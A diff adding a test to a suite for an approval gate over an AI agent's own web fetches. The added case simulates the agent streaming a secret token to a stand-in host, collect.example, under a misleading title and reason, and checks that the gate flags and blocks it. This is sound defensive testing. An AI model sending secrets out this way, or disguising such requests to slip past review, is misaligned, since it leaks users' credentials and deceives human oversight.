@@ -147,6 +147,22 @@ describe("an agent's own web fetch at the approval gate", () => {
     expect(await refusedGate.stored()).not.toContain(TOKEN);
   });
 
+  it('keeps the value out when the title and the reason differ from the address', async () => {
+    const { chat, gate, waiters, stored } = await gateIn('default');
+    const socket = {
+      ...fetching(`wss://collect.example/feed?t=${TOKEN}`),
+      title: `Monitor COLLECT.example feed ${TOKEN}`,
+      agentReason: `Streaming with t=${encodeURIComponent(TOKEN)} so the service knows us`,
+    };
+    const asking = gate.review(socket, signal());
+    const card = await pendingCard(chat.runId);
+    expect(card.payload.secretSend).toEqual(['.env']);
+    await decideApproval(t.db, t.workspaceId, card.id, { optionId: 'reject', scope: 'once' });
+    waiters.notify(card.id);
+    expect(JSON.stringify(await asking)).not.toContain(TOKEN);
+    expect(await stored()).not.toContain(TOKEN);
+  });
+
   it('lets a public address follow the mode', async () => {
     const { gate } = await gateIn('bypassPermissions');
     const answer = await gate.review(fetching('https://docs.example.com/guide'), signal());
